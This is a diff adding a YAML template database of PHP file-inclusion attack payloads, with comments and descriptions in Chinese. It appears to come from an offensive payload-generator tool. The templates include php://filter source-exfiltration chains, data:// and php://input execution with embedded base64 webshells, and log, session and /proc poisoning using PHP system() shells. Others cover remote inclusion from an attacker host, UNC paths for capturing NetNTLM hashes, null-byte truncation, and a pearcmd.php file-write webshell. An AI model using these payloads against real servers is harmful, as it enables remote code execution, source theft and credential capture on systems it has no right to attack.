@@ -1,0 +1,530 @@
+ruleDB: v0.1.0
+# 文件包含（LFI）模板。content_type 用 file-path。
+#
+# 和 `traversal` 的分工：那边管「用 ../ 读到任意文件」，这边管**包含**——
+# 伪协议（php://filter 读源码、data:// 直接执行、phar:// 反序列化）、
+# 日志 / 会话 / proc 包含、远程包含。`../` 的逐层递进不在这个文件里重复。
+#
+# 前提怎么配：伪协议类基本只要 `include-sink`（用户输入进到 include/require）。
+# `url-include`（allow_url_include=On）**只管 http:// 与 data://**，
+# 其余包装器不受它约束，所以只有那两类带它。
+# 日志 / 会话 / proc 包含要写码进去，带 `log-writable`；远程包含与 UNC 要
+# 目标出网、lhost 上有服务，带 `outbound` + `listener`。
+
+templates:
+  # ---- php://filter：把源码带出来，而不是执行它 ----
+
+  - id: lfi.generic.filter.base64
+    name: php://filter 读源码（base64）
+    desc: 最常用的一条——把 PHP 源码 base64 出来再看，避免被当成代码执行。目标是 PHP 且包含点可控就该先试它；被 php://filter 关键字拦下时改用 filter.chain
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    body: "php://filter/convert.base64-encode/resource=<<file>>"
+    vars: [file]
+    requires: [include-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.filter.rot13
+    name: php://filter 读源码（rot13）
+    desc: base64 关键字被过滤、或者回显处只允许字母数字时用 rot13。它只对字母生效，源码里的符号原样保留，本地要再过一遍 tr 解回来
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    body: "php://filter/read=string.rot13/resource=<<file>>"
+    vars: [file]
+    requires: [include-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.filter.iconv
+    name: php://filter 读源码（iconv 换编码）
+    desc: base64 与 rot13 都被挡时换一种编码带出内容——它不改内容的可读性，只换字节编码，输出要用对应编码转回来才看得懂
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    slots:
+      enc:
+        options:
+          - {id: utf16, name: "UTF-8 → UTF-16", chain: "convert.iconv.utf-8.utf-16"}
+          - {id: utf7,  name: "UTF-8 → UTF-7",  chain: "convert.iconv.utf-8.utf-7"}
+          - {id: utf32, name: "UTF-8 → UTF-32", chain: "convert.iconv.utf-8.utf-32"}
+        default: utf16
+    body: "php://filter/<<enc.chain>>/resource=<<file>>"
+    vars: [file]
+    requires: [include-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.filter.chain
+    name: php://filter 多重过滤器链
+    desc: 过滤只匹配了一次 convert.base64-encode 时，叠一条同样的过滤器就能错开匹配。注意**输出要 base64 解两次**，解一次看到乱码不代表没读到
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    body: "php://filter/convert.base64-encode|convert.base64-encode/resource=<<file>>"
+    vars: [file]
+    requires: [include-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 直接执行类包装器 ----
+
+  - id: lfi.generic.input
+    name: php://input 包含 POST 体
+    desc: 参数值就填 php://input，PHP 代码放进 POST 请求体（提交方式选「请求体原文」）。依赖 allow_url_include=On——PHP 5.2 起默认关闭，没开这条一定失败
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    body: "php://input"
+    vars: []
+    # php://input 也受 allow_url_include 管（只有 php://filter 不受）。
+    # 漏写这一条，声明「远程包含已关」的用户仍会看到它——而那正是筛不掉的假可用。
+    requires: [include-sink, url-include]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.data.base64
+    name: data:// 执行代码（base64）
+    desc: 不用往目标上落文件就能执行代码；base64 形态顺带躲开对 <?php 的明文检查。依赖 allow_url_include=On，且 PHP 要认 data:// 包装器
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: ">=5.2"
+    slots:
+      # 每条载荷都要现算 base64 太烦，所以把常用的几档做好。
+      # 想换成自己的代码：`printf '<?php ... ?>' | base64`，再加一档。
+      code:
+        options:
+          # 键加引号：PHP 8 起 $_GET[c] 是 Error（未定义常量 c），system() 根本不会执行。
+          # 这个错**没有任何机制能发现**——name 和 b64 互相一致，只有解码出来读才知道。
+          - {id: sys_get,   name: "system($_GET['c'])", b64: "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="}
+          - {id: eval_post, name: "@eval($_POST[1])",  b64: "PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg=="}
+          - {id: phpinfo,   name: "phpinfo()",         b64: "PD9waHAgcGhwaW5mbygpOyA/Pg=="}
+        default: sys_get
+    body: "data://text/plain;base64,<<code.b64>>"
+    vars: []
+    requires: [include-sink, url-include]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.data.plain
+    name: data:// 执行代码（明文）
+    desc: 明文形态读起来直观、改起来方便；`<?` 是明文，被过滤时改用 data.base64。同样依赖 allow_url_include=On
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: ">=5.2"
+    body: "data://text/plain,<?php system($_GET[c]); ?>"
+    vars: []
+    requires: [include-sink, url-include]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.expect
+    name: expect:// 执行命令
+    desc: 包含 expect:// 等于直接执行命令，效果和命令注入一样。但它要目标装了 expect 扩展——默认不带，选之前先确认 phpinfo 里有这一节
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    body: "expect://<<command>>"
+    vars: [command]
+    requires: [include-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- phar / zip：读包内文件，顺带反序列化 ----
+
+  - id: lfi.generic.phar
+    name: phar:// 读文件 / 触发反序列化
+    desc: 读 phar 包内文件；更值钱的是任何文件操作碰到 phar:// 都会反序列化它的元数据——配一个已上传的恶意 phar 就是反序列化入口，此时被包含的文件本身不必是 PHP
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: ">=5.3"
+    body: "phar://<<file>>"
+    vars: [file]
+    requires: [include-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.phar.inner
+    name: phar:// 读包内文件
+    desc: 带上包内路径才能读到具体文件；想执行包里的 PHP 时用它。phar:// 只认 phar 格式的归档，普通 zip 走 zip.inner
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: ">=5.3"
+    body: "phar://<<file>>/<<inner>>"
+    vars: [file, inner]
+    requires: [include-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.zip.inner
+    name: zip:// 读压缩包内文件
+    desc: "把上传的 zip 里的 PHP 当代码包含执行；`#` 在 URL 里是 fragment 起点，提交前要编码成 %23，否则服务端只收到 # 之前的部分（输出层选 curl 时能看到它已经被编码）"
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: ">=5.2"
+    body: "zip://<<file>>#<<inner>>"
+    vars: [file, inner]
+    requires: [include-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 日志 / 会话 / proc：先把码写进去，再包含它 ----
+
+  - id: lfi.generic.log.apache
+    name: Apache access.log 包含
+    desc: 把 PHP 代码写进 access.log 再包含执行——UA 或请求行里带上 <?php system($_GET[c]);?>，路径按发行版选。先看一眼原始日志：< > 被转义成 \x3c 时这条不成立
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      log:
+        options:
+          - {id: debian, name: "Debian / Ubuntu", path: "/var/log/apache2/access.log"}
+          - {id: rhel,   name: "RHEL / CentOS",   path: "/var/log/httpd/access_log"}
+          - {id: custom, name: "源码编译默认",     path: "/usr/local/apache/logs/access_log"}
+        default: debian
+    body: "<<log.path>>"
+    vars: []
+    requires: [include-sink, log-writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.log.nginx
+    name: Nginx access.log 包含
+    desc: 请求行和 UA 都会进 access.log，写码后包含它；error.log 只在报错内容可控时才有用，默认那条路更窄
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      log:
+        options:
+          - {id: access, name: "access.log（请求行 / UA）", path: "/var/log/nginx/access.log"}
+          - {id: error,  name: "error.log（需要可控的报错内容）", path: "/var/log/nginx/error.log"}
+        default: access
+    body: "<<log.path>>"
+    vars: []
+    requires: [include-sink, log-writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.log.ssh
+    name: SSH 认证日志包含
+    desc: 用户名会原样写进认证日志——先 ssh '<?php system($_GET[c]);?>'@target 写码，再包含日志执行。注意日志行有前缀、用户名里也不能带空格
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      log:
+        options:
+          - {id: debian, name: "Debian / Ubuntu", path: "/var/log/auth.log"}
+          - {id: rhel,   name: "RHEL / CentOS",   path: "/var/log/secure"}
+        default: debian
+    body: "<<log.path>>"
+    vars: []
+    requires: [include-sink, log-writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.session
+    name: 会话文件包含
+    desc: sid 从 Cookie PHPSESSID 取；能把代码写进某个 session 字段（用户名、个人简介）时用这条。没有可控写入点时，用 session.upload_progress 让 PHP 自己把进度写进 session 文件
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    slots:
+      sess:
+        options:
+          - {id: debian,  name: "Debian / Ubuntu",      prefix: "/var/lib/php/sessions/sess_"}
+          - {id: tmp,     name: "未配 session.save_path", prefix: "/tmp/sess_"}
+          - {id: rhel,    name: "RHEL / CentOS",        prefix: "/var/lib/php/session/sess_"}
+          - {id: windows, name: "Windows",              prefix: 'C:\Windows\Temp\sess_'}
+        default: debian
+    body: "<<sess.prefix>><<sid>>"
+    vars: [sid]
+    requires: [include-sink, log-writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.proc.environ
+    name: /proc/self/environ 包含
+    desc: 老式 CGI / mod_php 下 HTTP 头会进环境变量，UA 里写码后包含它执行；php-fpm 的 environ 基本是空的，现代目标多半不成立
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "/proc/self/environ"
+    vars: []
+    requires: [include-sink, log-writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 远程包含 ----
+
+  - id: lfi.generic.rfi.http
+    name: 远程包含（http://）
+    desc: include 吃远程地址时直接执行 lhost 上的 PHP——lhost 上放的是 PHP 源码、不是文本。需要 allow_url_include=On，PHP 5.2 起默认关闭；应用在后面拼了后缀就改用 truncate.question
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "http://<<lhost>>/<<file>>"
+    vars: [lhost, file]
+    requires: [include-sink, outbound, listener, url-include]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.rfi.unc
+    name: 远程包含（Windows UNC）
+    desc: Windows 上把 UNC 路径当包含目标——既能执行 lhost 共享里的 PHP，也能让目标主动发 SMB 请求（可抓 NetNTLM 哈希）。Linux 目标不认 UNC，这条对它们没意义
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: '\\<<lhost>>\<<share>>\<<file>>'
+    vars: [lhost, share, file]
+    requires: [include-sink, outbound, listener, os-windows]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 截断：把应用拼上去的后缀甩掉 ----
+
+  - id: lfi.generic.nullbyte
+    name: 空字节截断
+    desc: 应用把参数拼成 `<<file>>.php` 这类形式时，用空字节把后缀截掉——读到的才是你指定的文件。PHP 5.3.4 之后已修复，老环境（或从别处继承了老解释器）才值得试
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "<5.3.4"
+    slots:
+      w:
+        options:
+          - {id: filter_base64, name: "php://filter 读源码", prefix: "php://filter/convert.base64-encode/resource="}
+          - {id: plain,         name: "直接包含本地文件",     prefix: ""}
+        default: filter_base64
+    body: "<<w.prefix>><<file>>%00"
+    vars: [file]
+    requires: [include-sink, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.truncate.question
+    name: 问号截断后缀（远程包含）
+    desc: 应用在参数后面拼了固定后缀时，用 ? 让后缀落进 URL 的查询串、不进文件名——只对 http:// 这类远程包装器成立；本地路径里 ? 是合法文件名字符，截不断
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "http://<<lhost>>/<<file>>?"
+    vars: [lhost, file]
+    requires: [include-sink, outbound, listener, url-include, weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- /proc/self：不需要写文件就能拿到的两个目标 ----
+
+  - id: lfi.generic.proc.fd
+    name: /proc/self/fd/ 包含已打开的文件
+    desc: 目标把上传的文件存到临时路径、但你在响应里拿不到那个路径时用——PHP 处理上传期间文件以**打开的文件描述符**形式存在于当前进程，`/proc/self/fd/N` 就能包含到它。N 要从 3 开始挨个试（3 通常是第一个，往后是日志 fd、socket）。**fd 号每次请求都可能不同**，所以「写码」和「包含」要尽量在同一个请求里完成；包含到 socket 或管道时读会阻塞，请求超时不一定代表这条不通
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "/proc/self/fd/<<n>>"
+    vars: [n]
+    requires: [include-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.proc.cmdline
+    name: /proc/self/cmdline 读进程启动参数
+    desc: 想确认**当前进程是什么**（php-fpm / mod_php / CGI）和它的启动参数时用——`-d` 覆盖过哪些 ini、`--fpm-config` 指向哪个池配置都在里面，常能顺出 `allow_url_include`、`open_basedir` 的真实取值。注意 cmdline 是 **NUL 分隔**的，回显里通常只看到第一段（进程名），后面的参数被 NUL 截断或显示成乱码——那不是没读到。要拿完整命令行得配 `tr '\0' ' '`，那就得先有命令执行
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    body: "/proc/self/cmdline"
+    vars: []
+    requires: [include-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 会话：不依赖目标提供可控写入点 ----
+
+  - id: lfi.generic.session.upload_progress
+    name: session.upload_progress 写会话再包含
+    desc: "目标**没有**任何能把代码写进 session 的输入点（用户名、简介都过滤了）时用这条：PHP 的 `session.upload_progress` 机制会把上传进度写进 session 文件，字段名由 `session.upload_progress.name` 决定（默认 `PHP_SESSION_UPLOAD_PROGRESS`）。带一个 `Cookie: PHPSESSID=<sid>` 和一个同名 multipart 字段、值里放 PHP 代码，PHP 就把它原样写进 `sess_<sid>`。**sid 要自己指定**（`session.use_strict_mode=0` 时 PHP 接受任意 sid，默认就是 0）。载荷路径和 `lfi.generic.session` 一模一样，区别只在 requires——这条**不需要**目标提供可控写入点"
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    slots:
+      sess:
+        options:
+          - {id: tmp,     name: "session.save_path 未配（PHP 默认落在 /tmp）", prefix: "/tmp/sess_"}
+          - {id: debian,  name: "Debian / Ubuntu",       prefix: "/var/lib/php/sessions/sess_"}
+          - {id: rhel,    name: "RHEL / CentOS",         prefix: "/var/lib/php/session/sess_"}
+          - {id: windows, name: "Windows",               prefix: 'C:\Windows\Temp\sess_'}
+        default: tmp
+    body: "<<sess.prefix>><<sid>>"
+    vars: [sid]
+    requires: [include-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- php://filter 的编码器还有别的 ----
+
+  - id: lfi.generic.filter.zlib
+    name: php://filter 读源码（zlib 链）
+    desc: base64、rot13、iconv 都被挡时换 zlib。**关键在本地怎么解**：`zlib.deflate` 的输出是**裸 deflate 流、没有 zlib 头**，所以必须用 `zlib.decompress(data, -15)` 才能解（`python3 -c "import sys,zlib;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(),-15))"`）；选了带 base64 的那档就先 base64 解码再走这一步。`zlib.inflate` 是反方向，用在目标文件本身就是 zlib 压缩的时候。zlib 链还是构造 **filter chain RCE**（把任意文件当 PHP 执行）的基础积木，值得单独试一次它在不在白名单里
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    slots:
+      w:
+        options:
+          - {id: deflate,        name: "zlib.deflate（读出后本地解压）",              f: "zlib.deflate"}
+          - {id: inflate,        name: "zlib.inflate（目标文件本身是 zlib 压缩的）",   f: "zlib.inflate"}
+          - {id: deflate_base64, name: "zlib.deflate|convert.base64-encode（最好带走）", f: "zlib.deflate|convert.base64-encode"}
+        default: deflate
+    body: "php://filter/<<w.f>>/resource=<<file>>"
+    vars: [file]
+    requires: [include-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 用目标自带的 PEAR 写文件 ----
+
+  - id: lfi.generic.pearcmd
+    name: pearcmd.php 写文件再包含
+    desc: 目标装了 PEAR（很多发行版镜像默认带 php-pear）、`register_argc_argv=On`、且包含参数是直接拼在 URL 查询串里（`?file=` 这种）时用。把包含目标设成 `pearcmd.php`，再用 `&+config-create+` 塞进去两个**位置参数**——PEAR 会把「文件名」当内容源、按模板生成一个配置文件，于是 `<?=eval($_GET[1]);?>` 被写进 `/tmp/<<file>>`；第二步再包含那个文件。**两个前提缺一不可**：`register_argc_argv` 关掉时 argv 为空（PHP 默认 On，但不少发行版 ini 关了，先探一下）；参数必须落在 query 里，拼进 PATH_INFO 这条不成立。`+` 是空格的 URL 编码，别改成 `%20`——PEAR 读的是 argv 里的原始字符串
+    vuln: [lfi]
+    content_type: [file-path]
+    component: [php]
+    version: "*"
+    slots:
+      target:
+        options:
+          - {id: src,    name: "源码编译（/usr/local/lib/php）", path: "/usr/local/lib/php/pearcmd.php"}
+          - {id: debian, name: "Debian / Ubuntu（php-pear 包）",  path: "/usr/share/php/pearcmd.php"}
+          - {id: alpine, name: "Alpine（php7-pear）",             path: "/usr/share/php7/pearcmd.php"}
+        default: src
+    body: "<<target.path>>&+config-create+/<?=eval($_GET[1]);?>+/tmp/<<file>>"
+    vars: [file]
+    requires: [include-sink, writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 另外两处会原样记输入的日志 ----
+
+  - id: lfi.generic.log.mail
+    name: 邮件日志包含
+    desc: 目标会**发信**（注册确认、找回密码、工单通知）时用：把 PHP 代码放进收件人地址或主题里，MTA 会把它们原样写进日志。比 access.log 那条干净——日志噪音行少得多，`<?php ... ?>` 一眼就能找到。**代码里不能有空格**（邮件地址不允许），要塞就塞在主题或显示名里。日志行前面有时间戳和进程名前缀，代码要能容忍前面那一段
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      log:
+        options:
+          - {id: debian, name: "Debian / Ubuntu（postfix）", path: "/var/log/mail.log"}
+          - {id: rhel,   name: "RHEL / CentOS（postfix）",   path: "/var/log/maillog"}
+          - {id: exim,   name: "Exim",                      path: "/var/log/exim4/mainlog"}
+        default: debian
+    body: "<<log.path>>"
+    vars: []
+    requires: [include-sink, log-writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: lfi.generic.log.ftp
+    name: FTP 日志包含
+    desc: 目标开着 FTP 时用——登录时**用户名**会被原样记进日志，所以 `ftp '<?php system($_GET[1]);?>'@target` 打一次就把码写进去了（登录失败也记）。vsftpd 要 `log_ftp_protocol=YES` 才记完整命令，但失败登录默认就记；PAM 那一档（auth.log / secure）在多数发行版上更稳，和 `lfi.generic.log.ssh` 撞同一个文件时可以互相替代。用户名里不能有空格，代码要写紧凑
+    vuln: [lfi]
+    content_type: [file-path]
+    component: []
+    version: "*"
+    slots:
+      log:
+        options:
+          - {id: vsftpd,   name: "vsftpd",                  path: "/var/log/vsftpd.log"}
+          - {id: proftpd,  name: "ProFTPD",                 path: "/var/log/proftpd/proftpd.log"}
+          - {id: pureftpd, name: "Pure-FTPd",               path: "/var/log/pure-ftpd/pure-ftpd.log"}
+          - {id: auth,     name: "PAM 认证日志（更稳）",     path: "/var/log/auth.log"}
+        default: vsftpd
+    body: "<<log.path>>"
+    vars: []
+    requires: [include-sink, log-writable]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
